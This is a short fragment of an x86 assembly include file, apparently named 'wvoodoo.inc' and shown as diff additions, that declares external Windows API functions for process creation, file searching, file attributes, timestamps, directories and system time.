+     extrn CreateProcessA:PROC;
+     extrn CreateProcessW:PROC;
+     extrn CreateFileW:PROC;
+     extrn GetStartupInfoA:PROC;
+     extrn GetCommandLineA:PROC;
+     extrn lstrcpyA:PROC;
+     extrn   FindFirstFileA:PROC
+     extrn   FindNextFileA:PROC
+     extrn   Sleep:PROC ;(dwMilliseconds)
+     extrn SetFileAttributesA:PROC;(LpFileName,dwFileAttributes)
+     extrn SetFileTime:PROC;
+     extrn SetCurrentDirectoryA:PROC;
+     extrn GetCurrentDirectoryA:PROC;
+     extrn GetExitCodeProcess:PROC;
+     extrn GetSystemTime:PROC;
+===== end   wvoodoo.inc =====
